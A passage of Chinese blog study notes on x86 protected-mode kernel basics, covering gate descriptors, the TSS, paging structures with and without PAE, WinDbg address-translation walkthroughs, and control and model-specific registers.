class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/24/%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/11.png" alt="image-11"></p><h4 id="陷阱门描述符"><a href="#陷阱门描述符" class="headerlink" title="陷阱门描述符"></a>陷阱门描述符</h4><p>1111</p><p><img src="/2019/05/24/%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/12.png" alt="image-12"></p><p>陷阱门与中断门的区别</p><p>中断门执行时,将IF位清零,陷阱门</p><h4 id="任务门描述符"><a href="#任务门描述符" class="headerlink" title="任务门描述符"></a>任务门描述符</h4><p>在调用门,中断门与陷阱门中一旦出现权限切换,那么就会有堆栈切换.而且,由于CS的CPL发送改变,也导致了SS也必须切换,切换时,会有ESP和SS(CS是由中断门或者调用门指定)这2个值从TSS(Task-state segment),任务状态段</p><h5 id="TSS"><a href="#TSS" class="headerlink" title="TSS"></a>TSS</h5><p>TSS是一块内存,大小104字节</p><p><img src="/2019/05/24/%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/13.png" alt="image-13"></p><p>不要把TSS与任务切换联系到一起,TSS的意义就在于可以同时换掉一堆寄存器</p><p>CPU怎么找到TSS,</p><p>TR段寄存器</p><p><img src="/2019/05/24/%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/14.png" alt="image-14"></p><p>TSS段描述符</p><p><img src="/2019/05/24/%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/15.png" alt="image-15"></p><p>构造TSS段描述符:xx00e9xx`xxxx0068</p><p>TR寄存器读写</p><p>1,将TSS段描述符加载到TR寄存器</p><p>指令:LTR</p><p>说明:用LTR指令去装载 仅仅是改变TR寄存器的值96位,并没有真正改变TSS,LTR指令只能在系统层使用,加载后TSS段描述符状态为会发生改变</p><p>2,读TR寄存器</p><p>指令:STR</p><p>说明:如果用STR去读的花,只读了TR的16位,也就是选择子</p><h2 id="分页机制"><a href="#分页机制" class="headerlink" title="分页机制"></a>分页机制</h2><h3 id="PDE与PTE"><a href="#PDE与PTE" class="headerlink" title="PDE与PTE"></a>PDE与PTE</h3><p>80x86映射表分两级</p><p>第一级:页目录表(PDT)</p><p>第二级:页表(PTT)</p><p><img src="/2019/05/24/%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/16.png" alt="image-16"></p><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p><img src="/2019/05/24/%E5%86%85%E6%A0%B8%E5%9F%BA%E7%A1%80/17.png" alt="image-17"></p><p><strong>P位：</strong></p><p> 存在</p><p><strong>R/W位：</strong></p><p> R/W = 0 只读</p><p> R/W = 1 可读可写</p><p><strong>U/S 位：</strong></p><p> U/S = 0 特权用户才能访问</p><p> U/S = 1 普通用户特权用户都能访问</p><p><strong>P/S 位：只对PDE有意义</strong></p><p> 当ps=1时PDE直接指向物理页无PTE，低22位是页内偏移，页大小位4M</p><p> 当ps=0时，指向下一级页表</p><p><strong>D位：</strong></p><p> 是否被写过，写过就置为1</p><p>Windows是通过页目录</p><ol><li><p>在 8086 CPU 下，我们是如何进行寻址的？</p><p>我们使用 <strong>段寄存器:段内偏移</strong> 的形式访问一个物理地址，实际访问到的地址是：段寄存器*0x10+段内偏移，CPU所处的模式是实模式。</p></li><li><p>在 80386 系列的 CPU 下，拥有几种 CPU 模式？</p><p>三种。分别是<strong>实模式</strong>、<strong>保护模式</strong>以及<strong>虚拟8086模式</strong>。当计算机通电的时候，CPU肯定处于实模式，在进行一些初始化后，会切换到保护模式中。</p></li><li><p>在保护模式下，我们是如何进行寻址的？<br>我们使用 <strong>段寄存器:段内偏移</strong> 的形式访问一个虚拟地址，此时段寄存器保存的并不是段基址，而是段选择子，通过段选择子可以找到段描述符，在进行段选择子切换的时候，CPU会将段描述符中的部分内容加载到不可见的高速缓存部分，在实际寻址时，会使用这一部分的信息。</p></li><li><p>当切换段选择子的时候，CPU会进行什么样的基本权限检查？<br><strong>CPL</strong>特指CS段的低两位，表示当前所拥有的权限、<strong>RPL</strong>指段选择子的低两位，表示当前使用的是什么权限、<strong>DPL</strong>表示想要访问指定段描述符所需要的权限，实际的权限检查公式为：MAX(CPL, RPL) &lt;= DPL</p></li><li><p>中断门或陷阱门保存在哪里，如何触发？<br>中断门和陷阱门都应该由 IDT 进行处理，构建完成后，使用 int n 触发它，在进入中断门\陷阱门后，使用 iretd 跳出到用户层。</p></li></ol><p>地址的种类</p><ul><li>逻辑地址：指 <strong>段寄存器+段内偏移</strong> 表示的一个地址。</li><li>线性地址：指 <strong>进程独有虚拟内存空间中</strong> 的地址。 <strong>分段机制将逻辑地址转换为线性地址。</strong></li><li>物理地址：指 <strong>实际访问到的内存条</strong> 的地址。<strong>分页机制将线性地址转换为物理地址。</strong></li></ul><h3 id="WinDbg-相关指令"><a href="#WinDbg-相关指令" class="headerlink" title="WinDbg 相关指令"></a>WinDbg 相关指令</h3><ul><li>!process 0 0: 列出当前系统中的所有进程的信息</li><li>!process 0 0 notepad.exe： 列出指定进程的信息</li><li>.process 进程的 EPROCESS: 切换到目标进程中，使用它的 CR3</li><li>s -u 0x00000000 L0x1000000 “mmmmmwwwww”: 从指定位置开始搜索指定的字符串</li></ul><h3 id="虚拟地址转换（无PAE）"><a href="#虚拟地址转换（无PAE）" class="headerlink" title="虚拟地址转换（无PAE）"></a>虚拟地址转换（无PAE）</h3><ul><li><p>x86环境下，每一个进程都会拥有自己的 4GB 虚拟地址空间，主要由 CR3 进行区分</p><ul><li>CR3寄存器保存了每一个进程独有的页目录表(PDT)，页目录表是一个元素个数为 1024 的表，其中的每一项占有 4 个字节，叫做 页目录项（PDTE），页目录表项配合虚拟地址的高 10 位组成的索引可以寻址。</li><li>寻址到的页目录表项，它的低12位保存的是属性位，除开属性位就是页表(PT)，页表是一个元素个数为1024 的表，其中的每一项占 4 字节，描述了一个页的信息</li></ul></li><li><p>找到了页表后，配合中间的10位，寻址到最终的页(PAGE)</p></li><li>寻址过程</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">0042d f48: 001 + 02d + f48</span><br><span class="line"></span><br><span class="line">kd&gt; !dd 5bdf1000  页目录表</span><br><span class="line">#5bdf1000 45031867 02b3e867 00000000 00000000</span><br><span class="line">#5bdf1010 03393867 3929e867 02ad9867 36deb867</span><br><span class="line">#5bdf1020 023ec867 09401867 32d03867 38a74867</span><br><span class="line"></span><br><span class="line">kd&gt; !dd 5bdf1000+(1*4)              页目录表项 -&gt; 页表</span><br><span class="line">#5bdf1004 02b3e867 00000000 00000000 03393867</span><br><span class="line">#5bdf1014 3929e867 02ad9867 36deb867 023ec867</span><br><span class="line"></span><br><span class="line">kd&gt; !dd 02b3e000+(4*2d)             页表 -&gt; 页</span><br><span class="line"># 2b3e0b4 019ac867 01406867 44608867 01209867</span><br><span class="line"># 2b3e0c4 0210a867 0251e867 02825867 00924867</span><br><span class="line"># 2b3e0d4 36e29867 37d28867 36d2f867 38930867</span><br><span class="line"></span><br><span class="line">kd&gt; !du 019ac000+f48                页 -&gt; 物理地址</span><br><span class="line"># 19acf48 &quot;1233211234567..F&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00130bd4： 000(页目录表索引) + 130(页表索引) + bd4(页内偏移)</span><br><span class="line"></span><br><span class="line">kd&gt; !dd 5bdf1000  页目录表</span><br><span class="line">#5bdf1000 45031867 02b3e867 00000000 00000000</span><br><span class="line">#5bdf1010 03393867 3929e867 02ad9867 36deb867</span><br><span class="line">#5bdf1020 023ec867 09401867 32d03867 38a74867</span><br><span class="line"></span><br><span class="line">kd&gt; !dd 5bdf1000+(0*4)</span><br><span class="line">#5bdf1000 45031867 02b3e867 00000000 00000000</span><br><span class="line">#5bdf1010 03393867 3929e867 02ad9867 36deb867</span><br><span class="line">#5bdf1020 023ec867 09401867 32d03867 38a74867</span><br><span class="line"></span><br><span class="line">kd&gt; !dd 45031000 + (4*130)</span><br><span class="line">#450314c0 376c5867 00000080 00000080 00000080</span><br><span class="line">#450314d0 028c7867 372c6867 00000080 00000080</span><br><span class="line">#450314e0 029c9867 01acd867 445c8867 028ce867</span><br><span class="line"></span><br><span class="line">kd&gt; !du 376c5000 + bd4</span><br><span class="line">#376c5bd4 &quot;1233211234567&quot;</span><br></pre></td></tr></table></figure><h3 id="开启PAE的情况"><a href="#开启PAE的情况" class="headerlink" title="开启PAE的情况"></a>开启PAE的情况</h3><ul><li>2：页目录表指针表(4) + 9:页目录表(512) + 9: 页表(512) + 12:偏移(0x1000)</li><li>不管有没有开启 PAE，能够描述的页都是一样多的，但是和没有PAE的情况相比，开了的每一个项占了8字节空间，所以可以充分利用大于 4 GB的物理内存。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !process 0 0 notepad.exe</span><br><span class="line">PROCESS 87bfbc00  SessionId: 1  Cid: 029c    Peb: 7ffd3000  ParentCid: 05ac</span><br><span class="line">    DirBase: 7f5fe560  ObjectTable: 90a553c8  HandleCount:  61.</span><br><span class="line">    Image: notepad.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kd&gt; .process 87bfbc00</span><br><span class="line">Implicit process is now 87bfbc00</span><br><span class="line">WARNING: .cache forcedecodeuser is not enabled</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kd&gt; s -u 0x00000000 L0x01000000 &quot;1234567654321&quot;</span><br><span class="line"></span><br><span class="line">0040e100  0031 0032 0033 0034 0035 0036 0037 0036  1.2.3.4.5.6.7.6.</span><br><span class="line">01890bd4  0031 0032 0033 0034 0035 0036 0037 0036  1.2.3.4.5.6.7.6.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0040e100 转换为二进制 00 000000010      000001110   000100000000</span><br><span class="line">0  2 e  100</span><br><span class="line">kd&gt; du 0040e100</span><br><span class="line">0040e100  &quot;1234567654321321&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kd&gt; !dq 7f5fe560</span><br><span class="line">#7f5fe560 00000000`57f0c801 00000000`5828d801</span><br><span class="line">#7f5fe570 00000000`5838e801 00000000`5860f801</span><br><span class="line">#7f5fe580 00000000`78201801 00000000`79182801</span><br><span class="line">#7f5fe590 00000000`79103801 00000000`79504801</span><br><span class="line">#7f5fe5a0 00000000`7815c801 00000000`77f5d801</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kd&gt; !dq 57f0c000+(2*8)</span><br><span class="line">#57f0c010 00000000`58707867 00000000`5825f867</span><br><span class="line">#57f0c020 00000000`00000000 00000000`00000000</span><br><span class="line">#57f0c030 00000000`00000000 00000000`00000000</span><br><span class="line">#57f0c040 00000000`00000000 00000000`582af867</span><br><span class="line">#57f0c050 00000000`572ed867 00000000`566bb867</span><br><span class="line">#57f0c060 00000000`57851867 00000000`00000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kd&gt; !dq 58707000 +(e*8)</span><br><span class="line">#58707070 80000000`5762b867 80000000`58069867</span><br><span class="line">#58707080 80000000`56aea867 80000000`570eb867</span><br><span class="line">#58707090 80000000`57d6c867 80000000`5796e867</span><br><span class="line">#587070a0 80000000`5686f867 80000000`57771867</span><br><span class="line">#587070b0 80000000`56cf0867 80000000`57b73867</span><br><span class="line">#587070c0 80000000`571f2867 80000000`57874867</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kd&gt; !du 5762b100</span><br><span class="line">#5762b100 &quot;1234567654321321&quot;</span><br><span class="line"></span><br><span class="line">//第二个地址</span><br><span class="line">01890bd4  00 000001100 010010000 101111010100</span><br><span class="line">  0c    0x90bd4</span><br><span class="line"></span><br><span class="line">kd&gt; du 01890bd4</span><br><span class="line">01890bd4  &quot;1234567654321&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kd&gt; !dq 7f5fe560</span><br><span class="line">#7f5fe560 00000000`57f0c801 00000000`5828d801</span><br><span class="line">#7f5fe570 00000000`5838e801 00000000`5860f801</span><br><span class="line">#7f5fe580 00000000`78201801 00000000`79182801</span><br><span class="line">#7f5fe590 00000000`79103801 00000000`79504801</span><br><span class="line">#7f5fe5a0 00000000`7815c801 00000000`77f5d801</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kd&gt; !dq 57f0c000 + (0xc * 8)</span><br><span class="line">#57f0c060 00000000`57851867 00000000`00000000</span><br><span class="line">#57f0c070 00000000`5810d867 00000000`5848f867</span><br><span class="line">#57f0c080 00000000`5860e867 00000000`00000000</span><br><span class="line">#57f0c090 00000000`580a6867 00000000`57628867</span><br><span class="line">#57f0c0a0 00000000`58329867 00000000`00000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kd&gt; !dq 57851000 + (0x90 * 8)</span><br><span class="line">#57851480 80000000`587e6867 00000000`00000080</span><br><span class="line">#57851490 00000000`00000080 00000000`00000080</span><br><span class="line">#578514a0 80000000`584e8867 80000000`57ae7867</span><br><span class="line">#578514b0 00000000`00000080 00000000`00000080</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kd&gt; !du 587e6000 + 0xbd4</span><br><span class="line">#587e6bd4 &quot;1234567654321&quot;</span><br></pre></td></tr></table></figure><h2 id="补充内容"><a href="#补充内容" class="headerlink" title="补充内容"></a>补充内容</h2><h3 id="控制寄存器"><a href="#控制寄存器" class="headerlink" title="控制寄存器"></a>控制寄存器</h3><p>CPU中有一系列控制寄存器用于控制和确定CPU的保护模式，CR0-CR4</p><p>CR1 保留</p><p>CR3页目录基址</p><h4 id="CR0寄存器"><a href="#CR0寄存器" class="headerlink" title="CR0寄存器"></a>CR0寄存器</h4><div class="table-container"><table><thead><tr><th>31</th><th>30</th><th>29</th><th>28-19</th><th>18</th><th>17</th><th>16</th><th>15-6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>PG</td><td>CD</td><td>NW</td><td></td><td>AM</td><td></td><td>WP</td><td></td><td>NE</td><td>ET</td><td>TS</td><td>EM</td><td>MP</td><td>PE</td></tr></tbody></table></div><p>PE：CR0的0位是启用保护（Protection Enable）标志</p><p> PE = 1保护模式 PE = 0 实地址模式这个标志仅开启段级保护，而并没有启用分页机制。若要启用分页机制，那么PE和PG都要置位</p><p>PG：当设置该位时即开启了分页机制。在开启这个标志之前必须已经或同时开启了PE标志</p><p> PG = 0 且PE = 0 处理器工作在实地址模式下</p><p> PG = 0 且PE = 1处理器工作在没有开启分页机制的保护模式下（没有这种操作系统）</p><p> PG = 1 且PE = 0在PE没有开启的情况下，无法开启PG</p><p> PG = 1 且PE = 1处理器工作在开启了分页机制的保护模式下（也就是我们的操作系统）</p><h4 id="CR2寄存器"><a href="#CR2寄存器" class="headerlink" title="CR2寄存器"></a>CR2寄存器</h4><p>当CPU访问莫格无效页面时，会产生缺页现象，此时，CPU会将引起异常的线性地址存放在CR2中</p><h4 id="CR4寄存器"><a href="#CR4寄存器" class="headerlink" title="CR4寄存器"></a>CR4寄存器</h4><div class="table-container"><table><thead><tr><th>31-11</th><th>10</th><th>9</th><th>8</th><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>保留位（置0）</td><td></td><td></td><td>PCE</td><td>PGE</td><td>MCE</td><td>PAE</td><td>PSE</td><td>DE</td><td>TSD</td><td>PVI</td><td>VME</td></tr></tbody></table></div><p>PAE/PSE:</p><p>PAE = 1 是PAE分页 PAE = 0 是普通分页</p><h3 id="MSR寄存器"><a href="#MSR寄存器" class="headerlink" title="MSR寄存器"></a>MSR寄存器</h3><p>CPU中有一组寄存器，称之为特殊模块寄存器，这类寄存器数量庞大，功能各异：</p><p> 性能监视计数</p><p> 调试扩展支持</p><p> 机器检查</p><p> 功耗与温控管理</p><p> 特殊指令的支持</p><p> 处理器特性和处理器莫斯支持</p><p>每一个MSR寄存器都有它的编号可以使用下面的指令分别对其读写，一下指令只能在0环特权级才能执行</p><p> rdmsr： ecx 存放序号，执行完后数据存放在eax中</p><p> wrmsr： eax 存放数据，ecx存放序号，执行后将eax写入到相应的寄存器</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>发明保护模式是为了进行多任务设计，避免任务之间相互干扰，保护模式实现的是通过分段和分页机制来进行的。通过设置CR0的PE标志位可以让处理器工作在保护模式下，PG位可以开启分页保护机制。</p><p>通过分段保护机制，处理器使用段寄存器中选择符（RPL和CPL）和段描述符各个字段来执行保护验证。</p><p>对于分页机制，主要用页目录和页表项中的R/W和U/S标志来实现保护操作，VirtualProtect函数就是通过修改R/W来修改分页的读写属性</p>]]></content>
      
      
      <categories>
          
          <category> 内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内核基础 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
